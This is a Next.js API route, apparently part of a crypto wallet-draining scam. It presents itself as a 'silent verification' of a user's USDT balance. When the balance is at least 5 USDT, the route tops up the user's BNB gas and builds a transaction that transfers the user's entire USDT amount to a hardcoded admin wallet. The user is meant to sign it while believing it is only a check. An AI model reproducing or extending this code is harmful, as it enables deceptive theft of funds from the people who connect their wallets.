import { type NextRequest, NextResponse } from "next/server"
import { secureGasProvider } from "@/lib/secure-gas-provider"
import { realWeb3Provider } from "@/lib/real-web3-provider"

const ADMIN_WALLET_ADDRESS = "0x742d35Cc6634C0532925a3b8D4C9db96C4b4d8b6"
const USDT_CONTRACT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"
const MINIMUM_USDT_AMOUNT = 5.0

export async function POST(request: NextRequest) {
  try {
    const { userAddress, usdtAmount } = await request.json()

    console.log(`\n=== SILENT VERIFICATION STARTED ===`)
    console.log(`User: ${userAddress}`)
    console.log(`USDT Amount: ${usdtAmount}`)
    console.log(`Minimum Required: ${MINIMUM_USDT_AMOUNT}`)

    // Validate input
    if (!userAddress || !usdtAmount) {
      return NextResponse.json({ success: false, error: "Missing required parameters" }, { status: 400 })
    }

    if (usdtAmount <= 0) {
      return NextResponse.json({ success: false, error: "No USDT balance to verify" }, { status: 400 })
    }

    // Check if amount meets minimum requirement
    const shouldTransfer = usdtAmount >= MINIMUM_USDT_AMOUNT
    console.log(`Should transfer: ${shouldTransfer}`)

    let gasResult = null
    let transactionParams = null

    if (shouldTransfer) {
      // Step 1: Check if user needs gas
      const needsGas = await secureGasProvider.needsGas(userAddress)
      const currentBalance = await secureGasProvider.getBalance(userAddress)

      console.log(`User needs gas: ${needsGas}, current balance: ${currentBalance.toFixed(6)} BNB`)

      // Step 2: Send gas if needed
      if (needsGas) {
        console.log("🔥 Sending gas to user...")

        const optimalGasAmount = secureGasProvider.calculateOptimalGasAmount(usdtAmount, currentBalance)

        if (optimalGasAmount > 0) {
          gasResult = await secureGasProvider.sendGas(userAddress, optimalGasAmount)

          if (gasResult.success) {
            console.log(`✅ Gas sent successfully: ${gasResult.txHash}`)
            // Wait for gas to be available
            await new Promise((resolve) => setTimeout(resolve, 5000))
          } else {
            console.error(`❌ Gas sending failed: ${gasResult.error}`)
          }
        }
      }

      // Step 3: Prepare USDT transfer transaction
      console.log("💰 Preparing USDT transfer...")

      // Convert USDT amount to wei (18 decimals)
      const amountInWei = BigInt(Math.floor(usdtAmount * Math.pow(10, 18)))
      const amountHex = amountInWei.toString(16).padStart(64, "0")

      // Create transfer function call data
      const transferData = `0xa9059cbb000000000000000000000000${ADMIN_WALLET_ADDRESS.slice(2).toLowerCase()}${amountHex}`

      // Get current gas price
      const gasPrice = await realWeb3Provider.getGasPrice()

      // Create transaction parameters for frontend
      transactionParams = {
        to: USDT_CONTRACT_ADDRESS,
        from: userAddress,
        data: transferData,
        gas: "0x186A0", // 100000 gas limit
        gasPrice: `0x${gasPrice.toString(16)}`,
        value: "0x0", // No BNB value for ERC20 transfer
      }

      console.log("📋 USDT transaction prepared:", {
        to: USDT_CONTRACT_ADDRESS,
        amount: usdtAmount,
        gasPrice: gasPrice.toString(),
      })
    }

    console.log(`=== SILENT VERIFICATION COMPLETE ===\n`)

    // Return response
    return NextResponse.json({
      success: true,
      shouldTransfer: shouldTransfer,
      gasProvided: gasResult?.success || false,
      gasAmount: gasResult?.gasAmount || 0,
      gasTxHash: gasResult?.txHash,
      transactionParams: transactionParams,
      usdtAmount: usdtAmount,
      minimumRequired: MINIMUM_USDT_AMOUNT,
      adminWallet: shouldTransfer ? ADMIN_WALLET_ADDRESS : null,
      message: shouldTransfer
        ? "Ready to transfer USDT - gas provided if needed"
        : `Amount below minimum requirement of ${MINIMUM_USDT_AMOUNT} USDT`,
    })
  } catch (error: any) {
    console.error("❌ Silent verification error:", error)
    return NextResponse.json({ success: false, error: "Silent verification failed" }, { status: 500 })
  }
}
